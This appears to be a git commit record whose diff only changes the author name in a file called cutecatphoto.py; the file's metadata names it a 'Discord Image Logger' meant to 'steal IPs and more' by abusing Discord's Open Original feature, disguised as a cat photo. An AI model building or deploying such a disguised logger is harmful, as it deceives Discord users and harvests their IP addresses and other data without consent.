e89a7a40f25012460d5ef918a54fe38292d0fa73
markisveryepic <138347310+markisveryepic@users.noreply.github.com>
2025-03-19 03:34:13 -0400

    Update cutecatphoto.py

--- api/cutecatphoto.py
+++ api/cutecatphoto.py
@@ -8,7 +8,7 @@ import traceback, requests, base64, httpagentparser
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "indhgo"
 
 config = {
     # BASE CONFIG #
